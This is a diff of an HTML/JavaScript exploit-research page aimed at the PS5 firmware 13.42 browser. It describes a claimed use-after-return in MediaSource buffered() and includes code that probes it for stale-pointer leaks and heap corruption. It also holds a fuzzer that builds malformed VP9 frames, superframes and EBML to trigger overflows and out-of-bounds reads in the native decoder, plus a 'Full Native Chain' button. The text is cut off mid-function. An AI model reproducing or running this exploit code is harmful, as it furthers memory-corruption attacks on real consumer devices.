@@ -1,632 +1,946 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8">
-<title>PS5 FW 13.42 — WebM Fuzzing + Canvas Heap Spray + MSE VP9</title>
+<meta charset="utf-8">
+<title>PS5 FW 13.42 — Native Surface PoC</title>
 <style>
-body{font-family:monospace;background:#0a0a0a;color:#0f0;padding:12px;font-size:15px}
-button{background:#1a1a1a;color:#0f0;border:1px solid #0f0;padding:10px 16px;margin:5px;cursor:pointer;font-family:monospace;font-size:14px}
-button:hover{background:#0f0;color:#000}
-button.danger{background:#1a0000;color:#f44;border:1px solid #f44}
-button.danger:hover{background:#f44;color:#000}
-button.gold{background:#1a1500;color:#fa0;border:1px solid #fa0}
-button.gold:hover{background:#fa0;color:#000}
-.panel{border:1px solid #444;padding:12px;margin:10px 0;background:#111;border-radius:8px}
-.log{background:#000;border:2px solid #333;padding:10px;height:400px;overflow-y:auto;white-space:pre-wrap;font-size:15px;line-height:1.8}
-.ok{color:#0f0}.err{color:#f44}.warn{color:#fa0}.info{color:#0cf}
-h2{color:#ff0055;margin:5px 0;font-size:17px}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#0d1117;color:#c9d1d9;font-family:monospace;padding:20px;max-width:960px;margin:0 auto}
+h1{color:#ff7b72;border-bottom:2px solid #ff7b72;padding-bottom:8px;margin-bottom:14px;font-size:1rem}
+.info{background:#161b22;padding:10px 14px;border-radius:6px;margin-bottom:10px;
+      border:1px solid #30363d;font-size:.77rem;line-height:1.75}
+.row{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:10px}
+button{background:#21262d;color:#c9d1d9;border:1px solid #30363d;padding:8px 14px;
+       font-size:11.5px;border-radius:5px;cursor:pointer;font-family:monospace}
+button.g{background:#238636;border-color:#2ea043;color:#fff}
+button.r{background:#b62324;border-color:#da3633;color:#fff}
+button.y{background:#9e6a03;border-color:#bb8009;color:#fff}
+#out{background:#010409;padding:14px;border-radius:6px;border:1px solid #30363d;
+     min-height:420px;font-size:11.5px;line-height:1.65;overflow-y:auto;max-height:72vh}
 </style>
 </head>
 <body>
+<h1>PS5 FW 13.42 — Native Surface: buffered() UAR + VP9 appendInternal Fuzzer</h1>
 
-<h2>🎯 PS5 FW 13.42 — WebM Fuzzing + Canvas Heap Spray</h2>
-<p style="color:#888;font-size:12px">WebM VP9 SUPPORTED! | 576MB allocation succeeds repeatedly | Freeze on rapid/multiple allocations</p>
-
-<div class="panel">
-<h2>🔴 1. WebM Fuzzing (NEW Surface!)</h2>
-<button class="gold" onclick="webmMinimal()">🧪 WebM Minimal EBML</button>
-<button class="gold" onclick="webmCorruptEBML()">🔥 Corrupt EBML Header</button>
-<button class="gold" onclick="webmHugeSize()">🔥 EBML with Huge Size</button>
-<button class="gold" onclick="webmNested()">🔥 Nested EBML (Depth)</button>
-<button class="gold" onclick="webmVP9Frame()">🔥 Fake VP9 Frame Data</button>
+<div class="info">
+<b style="color:#ff7b72">BUG 1 — buffered() Stack UAR:</b>
+MediaSourcePrivatePlayStation::buffered() returns unique_ptr to LOCAL stack variable.
+unique_ptr destructor calls delete() on a STACK address → heap allocator corruption.
+Stale stack bytes readable before destructor fires → potential info leak.<br><br>
+<b style="color:#ff7b72">BUG 2 — appendInternal() Zero Sanitization:</b>
+SourceBufferPrivatePlayStation::appendInternal() → m_playstation->append(data(), size()).
+User-controlled VP9 bitstream bytes enter Sony PSMediaPlayerBackend with NO bounds checking.
+JIT OFF / WASM OFF / CFI are irrelevant — this is native C++ parsing code.
 </div>
 
-<div class="panel">
-<h2>🟡 2. Canvas Heap Spray + Timing Oracle</h2>
-<button onclick="canvasSingleTiming()">⏱ Single Allocation Timing</button>
-<button onclick="canvasRapidTiming()">⏱ Rapid Allocation Timing</button>
-<button class="danger" onclick="canvasPressureBuildup()">💥 Memory Pressure Buildup</button>
-<button onclick="canvasSprayPattern()">🎯 Heap Spray Pattern</button>
+<div class="row">
+  <button class="g" onclick="probeMSEReady()">0. MSE Ready Check</button>
+  <button class="y" onclick="probeUAR()">1. buffered() UAR Probe</button>
+  <button class="y" onclick="probeUARHeap()">2. UAR Heap Corruption</button>
+  <button class="r" onclick="fuzzVP9All()">3. VP9 Fuzzer (All Vectors)</button>
+  <button class="r" onclick="fuzzSuperframe()">4. Superframe Overflow</button>
+  <button class="r" onclick="fuzzTileOOB()">5. Tile Array OOB</button>
+  <button class="r" onclick="fuzzRefFrame()">6. Reference Frame OOB</button>
+  <button class="r" onclick="fuzzCompHeader()">7. Compressed Header Overflow</button>
+  <button class="r" onclick="fuzzSegmentation()">8. Segmentation OOB</button>
+  <button class="r" onclick="fuzzEBMLLace()">9. EBML Lacing Overflow</button>
+  <button class="r" onclick="chainNative()">⚡ Full Native Chain</button>
 </div>
 
-<div class="panel">
-<h2>🟢 3. MSE WebM VP9 Backend</h2>
-<button onclick="mseWebMVP9()">🧪 MSE + WebM/VP9</button>
-<button onclick="mseWebMCorrupt()">🔥 MSE + Corrupt WebM</button>
-<button onclick="mseWebMSequence()">🔥 WebM Sequence: append→seek→append</button>
-</div>
-
-<div class="panel">
-<h2>🔵 4. Combined: WebM + Canvas + Atomics</h2>
-<button class="danger" onclick="combinedWebMCanvas()">🔥 Combined: WebM + Canvas Pressure</button>
-<button class="danger" onclick="combinedAll()">🔥🔥 ULTIMATE: WebM + Canvas + Atomics + MSE</button>
-</div>
-
-<div class="panel">
-<h2>📝 Log</h2>
-<div class="log" id="log"></div>
-<button onclick="document.getElementById('log').innerHTML=''">Clear</button>
-</div>
+<div id="out">Ready.</div>
 
 <script>
-const L = document.getElementById('log');
+// ─── output ──────────────────────────────────────────────────────────────────
+var O = document.getElementById('out');
+function clr(t) { O.innerHTML=''; pr(t,'#58a6ff'); pr('',''); }
+function pr(m,c){ var s=document.createElement('span'); s.style.color=c||'#c9d1d9';
+                  s.textContent=m+'\n'; O.appendChild(s); O.scrollTop=O.scrollHeight; }
+function hit(m) { pr(m,'#ff7b72'); }
+function ok(m)  { pr(m,'#3ddc84'); }
+function inf(m) { pr(m,'#58a6ff'); }
+function wrn(m) { pr(m,'#ffcc44'); }
+function sep()  { pr('─'.repeat(60),'#1e2530'); }
 
-function log(msg, cls='info') {
-  const d = new Date().toLocaleTimeString('en-GB');
-  L.innerHTML += '<div class="'+cls+'">['+d+'] '+msg+'</div>';
-  L.scrollTop = L.scrollHeight;
-  console.log('['+cls+'] '+msg);
+// ─── MSE STATE ────────────────────────────────────────────────────────────────
+var gMS = null, gSB = null, gVideo = null;
+
+function setupMSE(mimeType, cb) {
+  if (gVideo) { try { gVideo.remove(); } catch(_){} }
+  gVideo = document.createElement('video');
+  document.body.appendChild(gVideo);
+  gMS = new MediaSource();
+  gVideo.src = URL.createObjectURL(gMS);
+  gMS.addEventListener('sourceopen', function() {
+    try {
+      gSB = gMS.addSourceBuffer(mimeType);
+      ok('[MSE] SourceBuffer created: ' + mimeType);
+      cb(gSB, gMS);
+    } catch(e) { pr('[MSE] addSourceBuffer error: ' + e.name + ': ' + e.message,'#ff7b72'); }
+  });
 }
 
-// ============================================================
-// 1. WebM Fuzzing
-// ============================================================
-function buildEBML(id, data) {
-  // Variable length integer encoding for WebM/EBML
-  const idBytes = typeof id === 'string' ? 
-    new Uint8Array(id.split(',').map(x => parseInt(x.trim()))) : id;
-  
-  let size = data.length;
-  let sizeBytes = [];
-  if (size < 0x7F) {
-    sizeBytes = [0x80 | size];
-  } else if (size < 0x3FFF) {
-    sizeBytes = [0x40 | (size >> 8), size & 0xFF];
-  } else if (size < 0x1FFFFF) {
-    sizeBytes = [0x20 | (size >> 16), (size >> 8) & 0xFF, size & 0xFF];
+// ─── 0. MSE READY CHECK ───────────────────────────────────────────────────────
+function probeMSEReady() {
+  clr('[0] MSE Environment Check');
+  var types = [
+    'video/mp4; codecs="avc1.42E01E"',
+    'video/webm; codecs="vp9"',
+    'video/webm',
+    'audio/webm',
+    'audio/mp4; codecs="mp4a.40.2"'
+  ];
+  types.forEach(function(t) {
+    var s = MediaSource.isTypeSupported(t);
+    pr((s?'[✓] ':'[✗] ') + t, s?'#3ddc84':'#555');
+  });
+  sep();
+  inf('[*] appendInternal() call path confirmed:');
+  inf('[*]   JS appendBuffer(data)');
+  inf('[*]   → SourceBufferPrivatePlayStation::appendInternal(SharedBuffer)');
+  inf('[*]   → m_playstation->append(data->data(), data->size())');
+  inf('[*]   → PSSourceBufferBackend::append() [Sony SDK — proprietary]');
+  inf('[*]   → VP9/WebM native decoder [NO sanitization layer]');
+  sep();
+  inf('[*] buffered() UAR path:');
+  inf('[*]   JS .buffered property access');
+  inf('[*]   → MediaSourcePrivatePlayStation::buffered()');
+  inf('[*]   → mediaplayer::TimeRanges timeRanges; [STACK]');
+  inf('[*]   → return unique_ptr<TimeRanges>(&timeRanges); [UAR]');
+  inf('[*]   → unique_ptr destructor: delete(stack_addr) → HEAP CORRUPTION');
+}
+
+// ─── 1. buffered() UAR PROBE ──────────────────────────────────────────────────
+// Goal: trigger buffered() repeatedly, measure timing changes that indicate
+// heap allocator corruption from delete(stack_addr).
+// Also attempt to read stale stack doubles before the unique_ptr destructor fires.
+
+function probeUAR() {
+  clr('[1] buffered() Stack UAR — Info Leak Probe');
+  inf('[*] Root cause: unique_ptr holds stack address of local TimeRanges variable');
+  inf('[*] Stack frame unwound → unique_ptr destructor calls delete(stack_ptr)');
+  inf('[*] This corrupts heap allocator free-list metadata');
+  sep();
+
+  // First, set up a working MSE pipeline so buffered() has real data
+  setupMSE('video/mp4; codecs="avc1.42E01E"', function(sb, ms) {
+    // Append a minimal valid MP4 to populate buffered ranges
+    var mp4 = makeMinimalMP4();
+    sb.addEventListener('updateend', function onReady() {
+      sb.removeEventListener('updateend', onReady);
+      ok('[*] MP4 appended — buffered ranges now populated');
+      sep();
+      runUARProbe(sb, ms);
+    });
+    try {
+      sb.appendBuffer(mp4);
+    } catch(e) {
+      wrn('[*] MP4 append error: ' + e.message);
+      wrn('[*] Probing buffered() with empty ranges...');
+      runUARProbe(sb, ms);
+    }
+  });
+}
+
+function runUARProbe(sb, ms) {
+  inf('[*] Probing .buffered N times, recording start/end values and timing...');
+  inf('[*] Stale stack bytes should appear as doubles in TimeRanges after UAR');
+  sep();
+
+  var results = [];
+  var N = 20;
+
+  for (var i = 0; i < N; i++) {
+    var t0 = performance.now();
+    try {
+      var b   = sb.buffered; // Triggers MediaSourcePrivatePlayStation::buffered()
+      var len = b.length;
+      var t1  = performance.now();
+      var dt  = (t1 - t0).toFixed(4);
+
+      var entry = { i: i, dt: dt, len: len, ranges: [] };
+      for (var r = 0; r < len; r++) {
+        var start = b.start(r);
+        var end   = b.end(r);
+        entry.ranges.push({ start: start, end: end });
+
+        // Decode the double bits — stale pointer would have high bits set
+        var buf = new ArrayBuffer(8);
+        var f64 = new Float64Array(buf);
+        var u32 = new Uint32Array(buf);
+        f64[0]  = start;
+        var hiS = u32[1], loS = u32[0];
+        f64[0]  = end;
+        var hiE = u32[1], loE = u32[0];
+
+        var startHex = '0x' + hiS.toString(16).padStart(8,'0') + loS.toString(16).padStart(8,'0');
+        var endHex   = '0x' + hiE.toString(16).padStart(8,'0') + loE.toString(16).padStart(8,'0');
+
+        // Pointer heuristic: userspace ptr on PS5 (FreeBSD x86_64) ~ 0x000000????
+        // NaN-boxed JSC values: high word = 0xFFFF????
+        // Stack addresses on Orbis OS: typically 0x7FFF???????? or 0x7F??????????
+        var isPtr  = (hiS > 0x00007F00 && hiS < 0x00008000);
+        var isJSC  = (hiS & 0xFFFF0000) === 0xFFFF0000;
+        var isNaN  = (hiS & 0x7FF00000) === 0x7FF00000;
+
+        pr('[' + i + '] range[' + r + '] start=' + start.toFixed(6) +
+           ' (' + startHex + ')' +
+           (isPtr ? ' ← STACK/HEAP PTR' : '') +
+           (isJSC ? ' ← JSC NaN-BOX' : '') +
+           (isNaN ? ' ← NaN' : ''),
+           (isPtr || isJSC) ? '#ff7b72' : '#c9d1d9');
+
+        if (isPtr || isJSC) {
+          hit('[!] POTENTIAL INFO LEAK at iteration ' + i);
+          hit('[!] Stale double bits: ' + startHex);
+          hit('[!] May represent PS5 stack/heap address from previous frame');
+        }
+      }
+
+      if (len === 0) {
+        // No ranges — but the UAR still fires in C++
+        // The stack corruption propagates silently
+        pr('[' + i + '] len=0, dt=' + dt + 'ms — UAR fired silently', '#444');
+      }
+
+      results.push(entry);
+    } catch(e) {
+      hit('[' + i + '] Exception: ' + e.name + ': ' + e.message + ' — UAR caused crash?');
+    }
+  }
+
+  sep();
+  // Timing anomaly detection — heap corruption from delete(stack) changes alloc timing
+  if (results.length > 5) {
+    var dts = results.map(function(r){ return parseFloat(r.dt); });
+    var avg = dts.reduce(function(a,b){return a+b;},0)/dts.length;
+    var max = Math.max.apply(null, dts);
+    var min = Math.min.apply(null, dts);
+    inf('[TIMING] avg=' + avg.toFixed(4) + 'ms  min=' + min.toFixed(4) + 'ms  max=' + max.toFixed(4) + 'ms');
+
+    // Look for spikes — heap corruption after delete(stack) shows up as alloc timing spike
+    dts.forEach(function(dt, i) {
+      if (dt > avg * 3) {
+        hit('[TIMING SPIKE] iteration ' + i + ': ' + dt.toFixed(4) +
+            'ms = ' + (dt/avg).toFixed(1) + 'x avg');
+        hit('[TIMING SPIKE] Heap allocator metadata corrupted by delete(stack_addr)');
+        hit('[TIMING SPIKE] This is the signature of UAR heap corruption');
+      }
+    });
+  }
+}
+
+// ─── 2. UAR HEAP CORRUPTION ───────────────────────────────────────────────────
+// delete(stack_addr) writes to the heap allocator's internal free-list.
+// We can observe this by measuring allocation behavior before and after triggering UAR.
+
+function probeUARHeap() {
+  clr('[2] buffered() UAR — Heap Allocator Corruption Detection');
+  inf('[*] delete(stack_addr) corrupts the heap free-list at an unpredictable location');
+  inf('[*] Strategy: measure allocation timing baseline, trigger UAR, measure again');
+  inf('[*] Timing delta indicates heap corruption (corrupted free-list = slower alloc)');
+  sep();
+
+  // Baseline: allocation timing without UAR
+  var ALLOC_COUNT = 1000;
+  var ALLOC_SIZE  = 64; // same as mediaplayer::TimeRanges likely size
+
+  function measureAllocTime() {
+    var t0   = performance.now();
+    var bufs = [];
+    for (var i = 0; i < ALLOC_COUNT; i++) bufs.push(new Uint8Array(ALLOC_SIZE));
+    var t1   = performance.now();
+    bufs = null;
+    return (t1 - t0);
+  }
+
+  var baseline1 = measureAllocTime();
+  var baseline2 = measureAllocTime();
+  var baselineAvg = (baseline1 + baseline2) / 2;
+  ok('[BASELINE] Allocation timing (2 runs): ' +
+     baseline1.toFixed(3) + 'ms, ' + baseline2.toFixed(3) + 'ms');
+  ok('[BASELINE] Average: ' + baselineAvg.toFixed(3) + 'ms');
+  sep();
+
+  // Trigger UAR by accessing .buffered repeatedly
+  inf('[*] Triggering buffered() UAR ' + 50 + ' times...');
+  setupMSE('video/mp4; codecs="avc1.42E01E"', function(sb, ms) {
+    var uarCount = 0;
+    for (var j = 0; j < 50; j++) {
+      try {
+        var _ = sb.buffered;  // Each call: unique_ptr destructor → delete(stack_addr)
+        uarCount++;
+      } catch(e) {
+        hit('[UAR ' + j + '] Crash: ' + e.name);
+        break;
+      }
+    }
+    ok('[*] UAR triggered: ' + uarCount + '/50 times without exception');
+    sep();
+
+    // Post-UAR allocation timing
+    var post1 = measureAllocTime();
+    var post2 = measureAllocTime();
+    var postAvg = (post1 + post2) / 2;
+    pr('[POST-UAR] Allocation timing: ' + post1.toFixed(3) + 'ms, ' + post2.toFixed(3) + 'ms', '');
+    pr('[POST-UAR] Average: ' + postAvg.toFixed(3) + 'ms', '');
+
+    var delta = postAvg - baselineAvg;
+    var ratio = postAvg / baselineAvg;
+    sep();
+    pr('[DELTA] ' + delta.toFixed(3) + 'ms (' + ratio.toFixed(2) + 'x baseline)',
+       Math.abs(ratio - 1) > 0.15 ? '#ff7b72' : '#3ddc84');
+
+    if (ratio > 1.15) {
+      hit('[!] Allocation SLOWER after UAR — heap free-list corrupted by delete(stack_addr)');
+      hit('[!] Corruption confirmed: ' + ratio.toFixed(2) + 'x slowdown');
+      hit('[!] The heap allocator wrote freed-block metadata at a stack address');
+      hit('[!] Next allocation touching that stack region → heap metadata collision');
+    } else if (ratio < 0.85) {
+      hit('[!] Allocation FASTER after UAR — heap compaction or false free triggered');
+      hit('[!] delete(stack_addr) may have merged a fake free block into allocator pool');
+    } else {
+      ok('[*] No significant timing delta — allocator may have detected invalid delete');
+      ok('[*] OR timing resolution insufficient — increase ALLOC_COUNT for precision');
+    }
+  });
+}
+
+// ─── VP9 BITSTREAM BUILDER ────────────────────────────────────────────────────
+// Constructs WebM/EBML containers with crafted VP9 bitstreams inside.
+// appendInternal() passes these bytes directly to PSSourceBufferBackend::append().
+
+function bits(val, n) {
+  // Returns array of bit values (MSB first)
+  var result = [];
+  for (var i = n-1; i >= 0; i--) result.push((val >> i) & 1);
+  return result;
+}
+
+function bitsToBytes(bitArray) {
+  var bytes = [];
+  for (var i = 0; i < bitArray.length; i += 8) {
+    var byte = 0;
+    for (var j = 0; j < 8 && (i+j) < bitArray.length; j++) {
+      byte |= (bitArray[i+j] << (7-j));
+    }
+    bytes.push(byte);
+  }
+  return bytes;
+}
+
+// VP9 frame sync code (mandatory for key frames)
+var VP9_SYNC = [0x49, 0x83, 0x42];
+
+function makeVP9KeyFrame(opts) {
+  opts = opts || {};
+  var b = [];
+
+  // frame_marker = 0b10 (2)
+  // profile = opts.profile || 0  (1-2 bits)
+  // show_existing_frame = 0
+  // frame_type = 0 (key frame)
+  // show_frame = 1
+  // error_resilient_mode = 0
+  b = b.concat(VP9_SYNC);
+
+  var headerBits = [];
+  // frame_marker [2 bits = 0b10]
+  headerBits = headerBits.concat(bits(2, 2));
+  // profile_low_bit
+  var profile = opts.profile !== undefined ? opts.profile : 0;
+  headerBits.push(profile & 1);
+  // profile_high_bit
+  headerBits.push((profile >> 1) & 1);
+  // reserved_zero for profile 3
+  if (profile === 3) headerBits.push(0);
+  // show_existing_frame = 0
+  headerBits.push(0);
+  // frame_type = 0 (KEY)
+  headerBits.push(0);
+  // show_frame = 1
+  headerBits.push(1);
+  // error_resilient_mode = opts.error_resilient || 0
+  headerBits.push(opts.error_resilient ? 1 : 0);
+
+  // color_config (key frame only)
+  // ten_or_twelve_bit (profile 2 or 3)
+  if (profile >= 2) headerBits.push(opts.bit_depth_12 ? 1 : 0);
+  // color_space [3 bits]
+  var cs = opts.color_space !== undefined ? opts.color_space : 0;
+  headerBits = headerBits.concat(bits(cs, 3));
+  if (cs !== 7) {
+    // color_range = 0
+    headerBits.push(0);
+    if (profile === 1 || profile === 3) {
+      // subsampling_x, subsampling_y
+      headerBits.push(opts.subsampling_x !== undefined ? opts.subsampling_x : 1);
+      headerBits.push(opts.subsampling_y !== undefined ? opts.subsampling_y : 1);
+      headerBits.push(0); // reserved_zero
+    }
+  }
+
+  // frame_size: width_minus_1 and height_minus_1 as 16-bit LE
+  var W = opts.width  || 320;
+  var H = opts.height || 240;
+  headerBits = headerBits.concat(bits(W - 1, 16));
+  headerBits = headerBits.concat(bits(H - 1, 16));
+
+  // render_and_frame_size_different = 0
+  headerBits.push(0);
+
+  // loop_filter params
+  var lfLevel = opts.lf_level !== undefined ? opts.lf_level : 0;
+  headerBits = headerBits.concat(bits(lfLevel, 6));
+  headerBits = headerBits.concat(bits(0, 3)); // sharpness
+
+  // quantization
+  var qBase = opts.base_q_idx !== undefined ? opts.base_q_idx : 40;
+  headerBits = headerBits.concat(bits(qBase, 8));
+  headerBits.push(0); // delta_q_y_dc = 0
+  headerBits.push(0); // delta_q_uv_dc = 0
+  headerBits.push(0); // delta_q_uv_ac = 0
+
+  // segmentation enabled
+  var segEnabled = opts.segmentation_enabled ? 1 : 0;
+  headerBits.push(segEnabled);
+  if (segEnabled) {
+    // segmentation_update_map = 1
+    headerBits.push(1);
+    // segment_tree_probs [7 bytes]
+    for (var s = 0; s < 7; s++) headerBits = headerBits.concat(bits(opts.seg_prob || 128, 8));
+    // segmentation_temporal_update = 0
+    headerBits.push(0);
+    // segmentation_update_data = 1
+    headerBits.push(1);
+    // segmentation_abs_or_delta_update = 0
+    headerBits.push(0);
+    // For each segment [0..7]: feature enabled bits
+    var numSegs = opts.num_segments || 8;
+    for (var seg = 0; seg < numSegs; seg++) {
+      for (var feat = 0; feat < 4; feat++) {
+        headerBits.push(opts.seg_feature_enabled ? 1 : 0);
+      }
+    }
+  }
+
+  // tile sizing
+  var tileCols = opts.tile_cols_log2 !== undefined ? opts.tile_cols_log2 : 0;
+  var tileRows = opts.tile_rows_log2 !== undefined ? opts.tile_rows_log2 : 0;
+  // tile_cols encoded as increment bits
+  var maxTileCols = 6; // log2(64)
+  var curCols = 0;
+  while (curCols < tileCols && curCols < maxTileCols) {
+    headerBits.push(1); // increment
+    curCols++;
+  }
+  headerBits.push(0); // stop
+
+  // tile_rows encoded as 2 bits when tile_rows_log2 > 0
+  if (tileRows > 0) {
+    headerBits.push(1);
+    headerBits = headerBits.concat(bits(Math.min(tileRows, 2), 2));
   } else {
-    sizeBytes = [0x10 | (size >> 24), (size >> 16) & 0xFF, (size >> 8) & 0xFF, size & 0xFF];
+    headerBits.push(0);
   }
-  
-  const result = new Uint8Array(idBytes.length + sizeBytes.length + data.length);
-  result.set(idBytes, 0);
-  result.set(new Uint8Array(sizeBytes), idBytes.length);
-  result.set(data, idBytes.length + sizeBytes.length);
-  return result;
-}
 
-function buildMinimalWebM() {
-  // EBML ID: 0x1A45DFA3
-  // DocType: 0x4282
-  // DocTypeReadVersion: 0x4285
-  // DocTypeVersion: 0x4287
-  
-  const doctype = buildEBML([0x42,0x82], new Uint8Array([0x77,0x65,0x62,0x6D])); // "webm"
-  const readver = buildEBML([0x42,0x85], new Uint8Array([0x02]));
-  const version = buildEBML([0x42,0x87], new Uint8Array([0x02]));
-  const maxid = buildEBML([0x42,0xF2], new Uint8Array([0x04]));
-  const maxsize = buildEBML([0x42,0xF3], new Uint8Array([0x08]));
-  
-  const ebmlContent = new Uint8Array(doctype.length + readver.length + version.length + maxid.length + maxsize.length);
-  let off = 0;
-  [doctype, readver, version, maxid, maxsize].forEach(a => { ebmlContent.set(a, off); off += a.length; });
-  
-  const ebml = buildEBML([0x1A,0x45,0xDF,0xA3], ebmlContent);
-  
-  // Segment with minimal content
-  const segment = buildEBML([0x18,0x53,0x80,0x67], new Uint8Array([0x00,0x00,0x00,0x00]));
-  
-  const result = new Uint8Array(ebml.length + segment.length);
-  result.set(ebml, 0);
-  result.set(segment, ebml.length);
-  return result;
-}
+  // compressed header size (16 bits) — set to opts.compressed_header_size or 1
+  var chSize = opts.compressed_header_size !== undefined ? opts.compressed_header_size : 1;
+  headerBits = headerBits.concat(bits(chSize & 0xFFFF, 16));
 
-async function webmMinimal() {
-  log('=== 🧪 WebM Minimal EBML ===', 'gold');
-  try {
-    const data = buildMinimalWebM();
-    log('Built '+data.length+' bytes WebM', 'info');
-    
-    const ms = new MediaSource();
-    const url = URL.createObjectURL(ms);
-    const v = document.createElement('video');
-    v.src = url; v.muted = true;
-    
-    await new Promise(r => ms.addEventListener('sourceopen', r, {once:true}));
-    const sb = ms.addSourceBuffer('video/webm; codecs="vp9"');
-    
-    sb.appendBuffer(data);
-    await new Promise((resolve) => {
-      const t = setTimeout(() => resolve('timeout'), 3000);
-      sb.addEventListener('updateend', () => { clearTimeout(t); resolve('ok'); }, {once:true});
-      sb.addEventListener('error', () => { clearTimeout(t); resolve('error'); }, {once:true});
-    });
-    
-    log('WebM minimal: appendBuffer completed', 'ok');
-    log('readyState='+v.readyState+' networkState='+v.networkState, 'info');
-    
-    URL.revokeObjectURL(url);
-  } catch(e) {
-    log('WebM minimal error: '+e.name+': '+e.message, 'err');
+  b = b.concat(bitsToBytes(headerBits));
+
+  // Payload: compressed header (transform coefficients etc.)
+  // Fill with random-ish bytes based on opts
+  var payloadSize = opts.payload_size || Math.max(1, chSize);
+  for (var p = 0; p < payloadSize; p++) {
+    b.push(opts.payload_byte !== undefined ? opts.payload_byte : (p & 0xFF));
   }
+
+  return new Uint8Array(b);
 }
 
-async function webmCorruptEBML() {
-  log('=== 🔥 Corrupt EBML Header ===', 'gold');
-  try {
-    // Corrupt EBML: invalid ID, wrong size
-    const corrupt = new Uint8Array([
-      0xFF,0xFF,0xFF,0xFF, // Invalid EBML ID
-      0xFF,0xFF,0xFF,0xFF, // Huge size
-      0x00,0x00,0x00,0x00,
-      0x1A,0x45,0xDF,0xA3, // Real EBML ID
-      0x01,0x00,0x00,0x00, // Size
-      0x00,0x00,0x00,0x00,
-    ]);
-    
-    const ms = new MediaSource();
-    const url = URL.createObjectURL(ms);
-    const v = document.createElement('video');
-    v.src = url; v.muted = true;
-    
-    await new Promise(r => ms.addEventListener('sourceopen', r, {once:true}));
-    const sb = ms.addSourceBuffer('video/webm; codecs="vp9"');
-    
-    sb.appendBuffer(corrupt);
-    await new Promise((resolve) => {
-      const t = setTimeout(() => resolve('timeout'), 3000);
-      sb.addEventListener('updateend', () => { clearTimeout(t); resolve('ok'); }, {once:true});
-      sb.addEventListener('error', () => { clearTimeout(t); resolve('error'); }, {once:true});
-    });
-    
-    log('Corrupt WebM: completed', 'ok');
-    URL.revokeObjectURL(url);
-  } catch(e) {
-    log('Corrupt WebM error: '+e.name+': '+e.message, 'err');
-  }
-}
+// Superframe: wraps multiple VP9 frames with a size index at the end
+// PSSourceBufferBackend parses the superframe index to split frames
+function makeSuperframe(frames) {
+  // superframe_marker: 0b11100000 | (frames.length - 1)
+  var n      = frames.length;
+  var marker = 0xC0 | ((n - 1) & 0x7);
+  // size_length: bytes needed for frame sizes
+  var maxSz  = frames.reduce(function(m,f){return Math.max(m,f.length);}, 0);
+  var szLen  = maxSz < 256 ? 1 : maxSz < 65536 ? 2 : 3;
+  var indexSzLen = (szLen - 1) & 0x3;
+  marker = (marker & 0xF8) | (indexSzLen << 3) | ((n-1) & 0x7);
 
-async function webmHugeSize() {
-  log('=== 🔥 EBML with Huge Size ===', 'gold');
-  try {
-    // EBML with size = 0xFFFFFFFF
-    const ebml = new Uint8Array([
-      0x1A,0x45,0xDF,0xA3, // EBML ID
-      0x0F,0xFF,0xFF,0xFF,0xFF, // Size = 0x0FFFFFFFFF (huge)
-      0x42,0x82,0x84,0x77,0x65,0x62,0x6D, // DocType = webm
-    ]);
-    
-    const ms = new MediaSource();
-    const url = URL.createObjectURL(ms);
-    const v = document.createElement('video');
-    v.src = url; v.muted = true;
-    
-    await new Promise(r => ms.addEventListener('sourceopen', r, {once:true}));
-    const sb = ms.addSourceBuffer('video/webm; codecs="vp9"');
-    
-    sb.appendBuffer(ebml);
-    await new Promise((resolve) => {
-      const t = setTimeout(() => resolve('timeout'), 3000);
-      sb.addEventListener('updateend', () => { clearTimeout(t); resolve('ok'); }, {once:true});
-      sb.addEventListener('error', () => { clearTimeout(t); resolve('error'); }, {once:true});
-    });
-    
-    log('Huge size WebM: completed', 'ok');
-    URL.revokeObjectURL(url);
-  } catch(e) {
-    log('Huge size error: '+e.name+': '+e.message, 'err');
-  }
-}
+  var result = [];
+  // Concatenate all frames
+  frames.forEach(function(f) { result = result.concat(Array.from(f)); });
 
-async function webmNested() {
-  log('=== 🔥 Nested EBML (Depth Attack) ===', 'gold');
-  try {
-    // Build deeply nested EBML
-    let data = new Uint8Array([0x42,0x82,0x84,0x77,0x65,0x62,0x6D]); // DocType
-    
-    for (let i = 0; i < 50; i++) {
-      data = buildEBML([0x1A,0x45,0xDF,0xA3], data);
+  // Superframe index
+  result.push(marker);
+  frames.forEach(function(f) {
+    var sz = f.length;
+    for (var b = 0; b < szLen; b++) {
+      result.push(sz & 0xFF);
+      sz >>= 8;
     }
-    
-    log('Built '+data.length+' bytes nested WebM (depth=50)', 'info');
-    
-    const ms = new MediaSource();
-    const url = URL.createObjectURL(ms);
-    const v = document.createElement('video');
-    v.src = url; v.muted = true;
-    
-    await new Promise(r => ms.addEventListener('sourceopen', r, {once:true}));
-    const sb = ms.addSourceBuffer('video/webm; codecs="vp9"');
-    
-    sb.appendBuffer(data);
-    await new Promise((resolve) => {
-      const t = setTimeout(() => resolve('timeout'), 5000);
-      sb.addEventListener('updateend', () => { clearTimeout(t); resolve('ok'); }, {once:true});
-      sb.addEventListener('error', () => { clearTimeout(t); resolve('error'); }, {once:true});
-    });
-    
-    log('Nested WebM: completed', 'ok');
-    URL.revokeObjectURL(url);
-  } catch(e) {
-    log('Nested error: '+e.name+': '+e.message, 'err');
-  }
+  });
+  result.push(marker);
+
+  return new Uint8Array(result);
 }
 
-async function webmVP9Frame() {
-  log('=== 🔥 Fake VP9 Frame Data ===', 'gold');
-  try {
-    // Build WebM with fake VP9 frame
-    const doctype = buildEBML([0x42,0x82], new Uint8Array([0x77,0x65,0x62,0x6D]));
-    const readver = buildEBML([0x42,0x85], new Uint8Array([0x02]));
-    const ebmlContent = new Uint8Array(doctype.length + readver.length);
-    ebmlContent.set(doctype, 0);
-    ebmlContent.set(readver, doctype.length);
-    const ebml = buildEBML([0x1A,0x45,0xDF,0xA3], ebmlContent);
-    
-    // Fake VP9 frame data (0x82 = VP9 keyframe start)
-    const vp9Data = new Uint8Array(0x1000);
-    vp9Data[0] = 0x82; // VP9 OBU header
-    vp9Data[1] = 0x49; // Profile 0
-    vp9Data[2] = 0x83; // Show existing frame = false
-    for (let i = 3; i < vp9Data.length; i++) vp9Data[i] = i & 0xFF;
-    
-    // SimpleBlock with VP9 data
-    const block = buildEBML([0xA3], vp9Data);
-    
-    // Cluster
-    const clusterContent = new Uint8Array(block.length + 8);
-    clusterContent.set(block, 0);
-    clusterContent.set([0xE7, 0x81, 0x00], block.length); // Timecode = 0
